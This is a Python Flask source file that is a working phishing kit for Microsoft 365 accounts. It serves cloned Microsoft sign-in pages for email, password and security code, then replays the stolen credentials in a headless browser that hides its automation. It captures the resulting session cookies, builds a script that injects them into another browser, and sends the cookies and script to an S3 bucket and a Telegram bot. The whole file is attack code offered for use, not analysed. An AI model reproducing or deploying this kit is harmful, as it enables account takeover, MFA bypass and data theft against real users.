import os
import time
import json
import uuid
import boto3
import threading
import requests
from flask import Flask, request
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

port = int(os.environ.get("PORT", 5000))

app = Flask(__name__)

HOME_DIR = os.path.expanduser("~")
BASE_CACHE_PATH = os.path.join(HOME_DIR, "AppData", "Local", "SysRunCache")
os.makedirs(BASE_CACHE_PATH, exist_ok=True)

TARGET_DOMAINS = [
    ".microsoftonline.com",
    ".login.microsoftonline.com",
    ".live.com",
    ".office.com",
    ".outlook.com",
    "m365.cloud.microsoft"
]

S3_BUCKET = os.getenv("S3_BUCKET")
S3_REGION = os.getenv("S3_REGION", "us-east-1")
S3_ACCESS_KEY = os.getenv("AWS_ACCESS_KEY_ID")
S3_SECRET_KEY = os.getenv("AWS_SECRET_ACCESS_KEY")

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

def setup_chrome(profile_path):
    chrome_options = Options()
    chrome_options.add_argument(f"--user-data-dir={profile_path}")
    chrome_options.add_argument("--profile-directory=Default")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-plugins")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_experimental_option("useAutomationExtension", False)
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--headless")
    return chrome_options

def wait_for_login(driver, session_id, timeout=120):
    start = time.time()
    while time.time() - start < timeout:
        url = driver.current_url.lower()
        if any(x in url for x in [
            "login.microsoftonline.com", "login.live.com", "login.windows.net"
        ]):
            time.sleep(2)
            continue
        try:
            driver.find_element("css selector", "div.o365cs-nav-appTile")
            capture_cookies(driver, session_id)
            return True
        except NoSuchElementException:
            pass
        if any(domain in url for domain in [
            "outlook.office.com", "m365.cloud.microsoft", "office.com"
        ]) and not any(x in url for x in [
            "login.microsoftonline.com", "login.live.com", "login.windows.net"
        ]):
            capture_cookies(driver, session_id)
            return True
        time.sleep(2)
    send_telegram_message("❌ Login timeout.")
    return False

def upload_to_s3(local_path, s3_key):
    s3 = boto3.client(
        "s3",
        aws_access_key_id=S3_ACCESS_KEY,
        aws_secret_access_key=S3_SECRET_KEY,
        region_name=S3_REGION
    )
    try:
        s3.upload_file(local_path, S3_BUCKET, s3_key)
        return f"https://{S3_BUCKET}.s3.{S3_REGION}.amazonaws.com/{s3_key}"
    except Exception as e:
        print(f"[ERROR] S3 Upload Failed: {e}")
        return None

def send_telegram_message(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[WARN] Telegram not configured.")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"[ERROR] Telegram notification failed: {e}")

def capture_cookies(driver, session_id):
    session_dir = os.path.join(BASE_CACHE_PATH, session_id)
    os.makedirs(session_dir, exist_ok=True)
    all_cookies = driver.get_cookies()
    relevant_cookies = [c for c in all_cookies if any(t in c.get('domain', '') for t in TARGET_DOMAINS)]

    cookie_file = os.path.join(session_dir, "mfa_session_data.json")
    script_file = os.path.join(session_dir, "mfa_inject_all_domains.js")
    with open(cookie_file, "w") as f:
        json.dump(relevant_cookies, f, indent=2)
    generate_injection_script(relevant_cookies, session_dir)

    cookie_url = upload_to_s3(cookie_file, f"sessions/{session_id}/mfa_session_data.json")
    script_url = upload_to_s3(script_file, f"sessions/{session_id}/mfa_inject_all_domains.js")

    send_telegram_message(f"✅ Session Captured!\nCookie: {cookie_url}\nScript: {script_url}")

    print(f"[SUCCESS] Session saved: {cookie_url}, {script_url}")

def generate_injection_script(cookies, session_dir):
    cookies_by_domain = {}
    for cookie in cookies:
        dom = cookie['domain'].lstrip('.')
        if dom not in cookies_by_domain:
            cookies_by_domain[dom] = []
        cookies_by_domain[dom].append(cookie)

    js_lines = [
        "console.log('Injecting Office 365 session cookies...');",
        "function setCookie(name, value, domain, path, secure, sameSite) {",
        "  let cookieStr = `${name}=${value}; path=${path || '/'}; domain=.${domain}; Max-Age=31536000;`;",
        "  if (secure) cookieStr += ' Secure;';",
        "  if (sameSite && sameSite !== 'None') cookieStr += ` SameSite=${sameSite};`;",
        "  document.cookie = cookieStr;",
        "}",
    ]
    for domain, domain_cookies in cookies_by_domain.items():
        js_lines.append(f"// --- Cookies for .{domain} ---")
        for c in domain_cookies:
            name = c['name'].replace("'", "\\'")
            value = c['value'].replace("'", "\\'")
            path = c.get('path', '/').replace("'", "\\'")
            secure = str(c.get('secure', False)).lower()
            sameSite = c.get('sameSite', 'None')
            js_lines.append(
                f"setCookie('{name}', '{value}', '{domain}', '{path}', {secure}, '{sameSite}');"
            )
    js_lines.append("console.log('All cookies injected. Redirecting...');")
    js_lines.append("setTimeout(() => window.location.href = 'https://m365.cloud.microsoft/?auth=1', 2000);")
    with open(os.path.join(session_dir, "mfa_inject_all_domains.js"), "w") as f:
        f.write("\n".join(js_lines))

def auto_login_dynamic_mfa(email, password, otp, totp, session_id):
    try:
        profile_path = os.path.join(BASE_CACHE_PATH, f"profile_{uuid.uuid4()}")
        os.makedirs(profile_path, exist_ok=True)
        chrome_options = setup_chrome(profile_path)
        driver = webdriver.Chrome(options=chrome_options)
        driver.get("https://login.microsoftonline.com")

        time.sleep(3)
        driver.find_element("css selector", "input[type='email']").send_keys(email)
        driver.find_element("css selector", "input[type='submit']").click()

        time.sleep(5)
        driver.find_element("css selector", "input[type='password']").send_keys(password)
        driver.find_element("css selector", "input[type='submit']").click()

        time.sleep(5)
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='otc'], input[name='authenticatorCode']"))
            )
            if otp:
                driver.find_element("css selector", "input[name='otc']").send_keys(otp)
            elif totp:
                driver.find_element("css selector", "input[name='authenticatorCode']").send_keys(totp)
            driver.find_element("css selector", "input[type='submit']").click()
        except TimeoutException:
            pass

        wait_for_login(driver, session_id)
    except Exception as e:
        send_telegram_message(f"❌ Auto-login failed: {e}")
        print(f"[ERROR] {e}")
    finally:
        try:
            driver.quit()
        except:
            pass

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Sign in to your Microsoft account</title>
        <link rel="icon" href="https://login.microsoftonline.com/favicon.ico">
        <style>
            body {
                background: radial-gradient(circle at 50% 50%, #f3f2f1 0%, #e6e6e6 100%);
                min-height: 100vh;
                margin: 0;
                font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
            }
            .outer-container {
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
            }
            .login-box {
                background: #fff;
                width: 400px;
                margin: 0 auto;
                padding: 40px 32px 32px 32px;
                border-radius: 4px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.2);
                text-align: left;
            }
            .logo {
                width: 28px;
                margin-bottom: 24px;
            }
            .input-box {
                width: 100%;
                padding: 10px;
                font-size: 16px;
                border: none;
                border-bottom: 1.5px solid #888;
                margin-bottom: 24px;
                outline: none;
                background: transparent;
            }
            .input-box:focus {
                border-bottom: 2px solid #0067b8;
            }
            .action-link {
                color: #0067b8;
                text-decoration: none;
                font-size: 13px;
                margin-right: 16px;
            }
            .action-link:hover {
                text-decoration: underline;
            }
            .next-btn {
                width: 100%;
                background: #0067b8;
                color: #fff;
                border: none;
                border-radius: 2px;
                padding: 12px 0;
                font-size: 16px;
                font-weight: 600;
                margin-top: 16px;
                cursor: pointer;
            }
            .signin-options {
                margin: 24px auto 0 auto;
                width: 400px;
                background: #fff;
                border-radius: 4px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.1);
                padding: 12px 0;
                text-align: center;
                font-size: 15px;
                color: #333;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .signin-options svg {
                margin-right: 8px;
            }
        </style>
    </head>
    <body>
        <div class="outer-container">
            <div class="login-box">
                <img src="https://logincdn.msauth.net/16.000.32221.1/images/microsoft_logo_ee5c8c9fb6248c7b3c6fd7b8d2b8b8c2.png" class="logo" alt="Microsoft">
                <div style="font-size: 24px; font-weight: 600; margin-bottom: 16px;">Sign in</div>
                <form action="/password" method="post">
                    <input class="input-box" type="email" name="email" placeholder="Email, phone, or Skype" required autocomplete="username">
                    <div>
                        <a class="action-link" href="#">No account? <span style="color:#0067b8;">Create one!</span></a>
                        <a class="action-link" href="#">Can't access your account?</a>
                    </div>
                    <button class="next-btn" type="submit">Next</button>
                </form>
            </div>
            <div class="signin-options">
                <svg width="20" height="20" fill="none"><path d="M10 0a10 10 0 100 20A10 10 0 0010 0zm0 18.333A8.333 8.333 0 1110 1.667a8.333 8.333 0 010 16.666z" fill="#666"/><path d="M10 5.833a.833.833 0 100 1.667.833.833 0 000-1.667zm0 3.334a.833.833 0 00-.833.833v3.333a.833.833 0 001.666 0v-3.333A.833.833 0 0010 9.167z" fill="#666"/></svg>
                Sign-in options
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/password', methods=['POST'])
def password_page():
    email = request.form['email']
    session_id = f"session_{int(time.time())}"
    with open(os.path.join(BASE_CACHE_PATH, f"{session_id}_email.txt"), "w") as f:
        f.write(email)
    return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Sign in to your Microsoft account</title>
        <link rel="icon" href="https://login.microsoftonline.com/favicon.ico">
        <style>
            body {{
                background: radial-gradient(circle at 50% 50%, #f3f2f1 0%, #e6e6e6 100%);
                min-height: 100vh;
                margin: 0;
                font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
            }}
            .outer-container {{
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
            }}
            .login-box {{
                background: #fff;
                width: 400px;
                margin: 0 auto;
                padding: 40px 32px 32px 32px;
                border-radius: 4px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.2);
                text-align: left;
            }}
            .logo {{
                width: 28px;
                margin-bottom: 24px;
            }}
            .input-box {{
                width: 100%;
                padding: 10px;
                font-size: 16px;
                border: none;
                border-bottom: 1.5px solid #888;
                margin-bottom: 24px;
                outline: none;
                background: transparent;
            }}
            .input-box:focus {{
                border-bottom: 2px solid #0067b8;
            }}
            .next-btn {{
                width: 100%;
                background: #0067b8;
                color: #fff;
                border: none;
                border-radius: 2px;
                padding: 12px 0;
                font-size: 16px;
                font-weight: 600;
                margin-top: 16px;
                cursor: pointer;
            }}
        </style>
    </head>
    <body>
        <div class="outer-container">
            <div class="login-box">
                <img src="https://logincdn.msauth.net/16.000.32221.1/images/microsoft_logo_ee5c8c9fb6248c7b3c6fd7b8d2b8b8c2.png" class="logo" alt="Microsoft">
                <div style="font-size: 24px; font-weight: 600; margin-bottom: 16px;">Enter password</div>
                <form action="/mfa_check" method="post">
                    <input type="hidden" name="session_id" value="{session_id}">
                    <input class="input-box" type="password" name="password" placeholder="Password" required autocomplete="current-password">
                    <button class="next-btn" type="submit">Sign in</button>
                </form>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/mfa_check', methods=['POST'])
def mfa_check():
    session_id = request.form['session_id']
    password = request.form['password']
    creds_file = os.path.join(BASE_CACHE_PATH, f"{session_id}_creds.json")
    with open(creds_file, "w") as f:
        json.dump({"password": password}, f)

    email_file = os.path.join(BASE_CACHE_PATH, f"{session_id}_email.txt")
    with open(email_file, "r") as f:
        email = f.read().strip()

    thread = threading.Thread(target=auto_login_dynamic_mfa, args=(email, password, None, None, session_id))
    thread.start()

    # Show a 2FA prompt (if needed, your backend will detect and handle)
    return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Enter security code</title>
        <link rel="icon" href="https://login.microsoftonline.com/favicon.ico">
        <style>
            body {{
                background: radial-gradient(circle at 50% 50%, #f3f2f1 0%, #e6e6e6 100%);
                min-height: 100vh;
                margin: 0;
                font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
            }}
            .outer-container {{
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
            }}
            .login-box {{
                background: #fff;
                width: 400px;
                margin: 0 auto;
                padding: 40px 32px 32px 32px;
                border-radius: 4px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.2);
                text-align: left;
            }}
            .logo {{
                width: 28px;
                margin-bottom: 24px;
            }}
            .input-box {{
                width: 100%;
                padding: 10px;
                font-size: 16px;
                border: none;
                border-bottom: 1.5px solid #888;
                margin-bottom: 24px;
                outline: none;
                background: transparent;
            }}
            .input-box:focus {{
                border-bottom: 2px solid #0067b8;
            }}
            .next-btn {{
                width: 100%;
                background: #0067b8;
                color: #fff;
                border: none;
                border-radius: 2px;
                padding: 12px 0;
                font-size: 16px;
                font-weight: 600;
                margin-top: 16px;
                cursor: pointer;
            }}
        </style>
    </head>
    <body>
        <div class="outer-container">
            <div class="login-box">
                <img src="https://logincdn.msauth.net/16.000.32221.1/images/microsoft_logo_ee5c8c9fb6248c7b3c6fd7b8d2b8b8c2.png" class="logo" alt="Microsoft">
                <div style="font-size: 24px; font-weight: 600; margin-bottom: 16px;">Enter security code</div>
                <form action="/final" method="post">
                    <input type="hidden" name="session_id" value="{session_id}">
                    <input class="input-box" type="text" name="mfa_code" placeholder="Code" required autocomplete="one-time-code">
                    <button class="next-btn" type="submit">Verify</button>
                </form>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/final', methods=['POST'])
def final():
    # You can process the MFA code here if needed
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Verifying...</title>
        <link rel="icon" href="https://login.microsoftonline.com/favicon.ico">
        <style>
            body { background: radial-gradient(circle at 50% 50%, #f3f2f1 0%, #e6e6e6 100%); min-height: 100vh; margin: 0; font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif; text-align: center; }
            .center { margin-top: 200px; }
        </style>
    </head>
    <body>
        <div class="center">
            <h2>Verifying your account...</h2>
            <img src="https://i.gifer.com/ZZ5H.gif" width="50">
            <p>You may close this window.</p>
        </div>
    </body>
    </html>
    '''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=port)
